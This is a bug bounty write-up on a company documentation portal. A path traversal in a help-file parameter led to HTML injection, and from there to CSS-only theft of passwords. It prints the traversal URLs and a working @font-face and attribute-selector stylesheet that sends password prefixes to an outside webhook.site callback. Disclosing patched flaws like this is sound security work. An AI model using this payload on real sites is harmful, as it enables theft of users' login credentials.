Introducing password-aware typography: a documentation feature that chooses a font based on the password you're entering, then reports the match to the font server.

I added it to a company's documentation viewer using an HTML injection and CSS. No pesky JavaScript required.

Some details in this writeup have been anonymized at the company's request.

## A help file, allegedly

The investigation started nearly a year ago, while I was asleep. My server was running [bbscope](https://github.com/sw33tLie/bbscope), which noticed a new program on HackerOne. Within minutes, it was scanning and enumerating the in-scope domains.

I picked up the results the next morning and found an interesting endpoint.

The company had a developer portal for its API documentation. One page accepted a URL like this:

```text
/resources/?branch=main&path=help/FAQ.md
```

Changing `path` changed the document loaded into part of the page. The application fetched the content server-side, so the parameter was directing a file lookup somewhere unknown to me.

The `branch=main` parameter suggested version control and the Markdown filename suggested a repository. Having noticed these clues, I began looking for local files on the server.

I added traversal sequences such as `/../` to see whether I could leave the expected directory. The application returned a 404.

A 404 is a versatile response. Perhaps I'd requested a file that didn't exist. Perhaps the application had rejected the path. Or perhaps I was just looking in the wrong place. The response didn't narrow this down.

I brought in [ffuf](https://github.com/ffuf/ffuf) and tried more local paths, which produced the same amount of useless information at a much higher rate.

Eventually, I returned to `branch=main`. What if `path` was part of a request to an external service? GitHub would explain both the branch name and the Markdown file. It would also explain why the server was so reluctant to provide files from a local filesystem it wasn't consulting.

## Bring your own documentation

GitHub's main website lives at `github.com`. Raw file content is available through `raw.githubusercontent.com`.

If the developer portal used that service, it might be constructing a URL along these lines:

```text
https://raw.githubusercontent.com/<company>/<repository>/<commit>/help/FAQ.md
```

I didn't know the company's repository or the commit it was using. Fortunately, the purpose of path traversal is to have a less committed relationship with the path you've been given.

I needed a public file with a known location and content I would recognize. The [SecLists README](https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/README.md) was a suitable candidate:

```text
/danielmiessler/SecLists/refs/heads/master/README.md
```

This uses a branch reference rather than a commit hash. GitHub's raw file service accepts both, so I could identify a file in a public repository without knowing anything about the company's default source.

I combined that path with traversal segments and sent a request resembling this:

```text
/resources/?branch=main&path=/../../../danielmiessler/SecLists/refs/heads/master/README.md
```

My hypothesis was that the traversal would escape the intended repository path, leaving the server to fetch:

```text
https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/README.md
```

I hit enter in the URL bar. Within seconds, the company's developer portal displayed the SecLists README. And just like that, the documentation team had acquired a new contributor.

This was considerably more informative than another 404. The application could retrieve a file from an unrelated public repository. The path controlled an external request, which explained why all my local-file testing had achieved so little.

Now that I could choose the repository, I could supply the file myself.

## Now with HTML support

So far, I had persuaded a documentation viewer to display a different document. This was useful, but it didn't really demonstrate a security impact.

I created `exploit.html` in a repository on my personal GitHub account and changed the `path` to point to it. The server fetched the file, noticed the `.html` extension, and rendered it as HTML inside the company's page.

I could now put my own code inside the company's website by getting someone to open a crafted link. I tried adding a script to `exploit.html`:

```html
<script>
  alert("JavaScript executed on " + location.origin);
</script>
```

No such luck. The site's Content Security Policy (CSP) blocked the script.

But my HTML was still in the page, so I tried adding a stylesheet. The page accepted my CSS without flinching.

CSS exfiltration combines two otherwise ordinary capabilities: matching elements based on their attributes and loading external resources. By tying one to the other, a stylesheet can turn a match into a network request that reveals information about the page.

The question was whether there was anything sensitive on the page for it to match.

Lucky for me, the page came with a login form.

## Passwords deserve typography too

Some of the company's API documentation was public, but accessing the more proprietary material required a username and password. The login form was part of the same DOM as my injected HTML, so my CSS could target it directly.

CSS attribute selectors can test whether an HTML attribute begins with a particular string:

```css
input[name="password"][value^="a"] {
  font-family: "prefix-a", sans-serif;
}
```

This matches a password input whose HTML `value` attribute starts with `a`, then selects the font family `prefix-a`.

There is a distinction between that attribute and what a user types. We'll get to it shortly. First, the font needs somewhere to live.

With `@font-face`, I can give a font family an external source URL. When the browser needs the font, it attempts to retrieve it. If I control the endpoint, I can observe the request.

Assign each candidate prefix its own font family and URL, and the stylesheet can report its findings under the entirely respectable pretense of typography:

```html
<style>
@font-face {
  font-family: "prefix-a";
  src: url("https://webhook.site/<webhook-id>?a");
}
@font-face {
  font-family: "prefix-ab";
  src: url("https://webhook.site/<webhook-id>?ab");
}
@font-face {
  font-family: "prefix-abc";
  src: url("https://webhook.site/<webhook-id>?abc");
}

input[name="password"][value^="a"] {
  font-family: "prefix-a", sans-serif;
}
input[name="password"][value^="ab"] {
  font-family: "prefix-ab", sans-serif;
}
input[name="password"][value^="abc"] {
  font-family: "prefix-abc", sans-serif;
}
</style>
```

The ordering matters. These selectors have equal specificity, so the last matching rule wins.

With a value of `a`, the first rule selects `prefix-a`. With `ab`, both the first and second rules match, but the second comes later and selects `prefix-ab`. With `abc`, the third rule takes over.

Each selected family points to a URL with different parameters. When the browser requests the font, the query string identifies the matching prefix.

> The example above is deliberately tiny. The stylesheet in my report contained hundreds of thousands of lines to cover as many character combinations as possible. Password-aware typography has precise design requirements.

The reporting mechanism was in place. But there was still the small matter of whether the stylesheet could see the password at all.

## Two values, one unfortunate arrangement

An `<input>` has both a live `value` property and an HTML `value` attribute. Typing normally updates the live property, but leaves the attribute unchanged. Since CSS attribute selectors inspect the attribute rather than the property, they can't see what the user types unless something keeps the two synchronized.

This distinction is essential. Without a sensitive value in an attribute CSS can match, the CSS exfiltration scheme above is mostly an expensive way to request nothing.

I checked the page with Wappalyzer, a Firefox extension that identifies the technologies a website uses. It detected React, which gave me an idea.

Some versions of React update the HTML `value` attribute as the user types, making the current value visible to CSS attribute selectors. React's developers have [discussed this behavior](https://github.com/facebook/react/issues/11896), and Jake Archibald explains its security implications in [Third-party CSS is not safe](https://jakearchibald.com/2018/third-party-css-is-not-safe/).

Of course, finding React on the page didn't guarantee that the password field behaved this way. I tested the form to find out.

Conveniently, the password value was visible to CSS.

That completed the feature requirements: content I controlled inside the page, a password my selectors could match, and a permitted request to my server.

## The font server would like a word

I hosted the payload in my GitHub repository and loaded it through the crafted documentation URL.

Then I clicked the password input and started typing.

Almost immediately, requests appeared at my callback endpoint. Their query strings reported the characters I had entered, with requests like this:

```text
https://webhook.site/<webhook-id>?<password>
```

The chain worked. A parameter meant to select a help document let me load my own HTML into the company's page. My CSS could reach the real login form, match the exposed password value, and report the match through an external font request.

## Feature withdrawn

I was new to bug bounty when I discovered this, but I had already mastered one technique: trying the same wrong idea repeatedly with a different filename.

I'd treated `path` as a local filesystem path from the beginning, and every 404 sent me looking for another file to try. The nearby `branch=main` suggested a repository, but didn't establish how the application accessed it. It took me a while to stop guessing filenames and start questioning how the files were being retrieved. That change in approach eventually led me to GitHub.

With the font requests demonstrating the impact, I submitted the report. The company triaged the issue as medium severity, patched it, and thanked me.

Password-aware typography did not receive widespread adoption.
